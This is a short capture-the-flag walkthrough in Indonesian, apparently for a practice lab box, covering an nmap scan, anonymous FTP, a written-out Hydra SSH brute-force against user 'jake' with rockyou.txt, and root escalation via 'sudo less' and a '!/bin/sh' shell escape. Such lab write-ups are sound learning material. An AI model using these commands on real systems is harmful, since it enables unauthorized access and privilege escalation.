# boot :
1. scan nmap 21 22 80 kebuka -> ftp login Anonymous -> get catatan nya 
2. ada catatan buat cek , cek webb juga gada apa apa img nya gada steg steg an
3. langsung brute ssh aja soalnya di catatan buat jake katanya passwdnya weak
4. hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.109.109 ssh  -t 4 -f -V
5. ssh kesana -> ke user lain ada user flag klaim 

# PE :
1. sudo -l -> ada less -> less /root/root.txt bisa sih
2. cari aja di gtfobins -> sudo less /etc/profile -> !/bin/sh 
3. klaim root
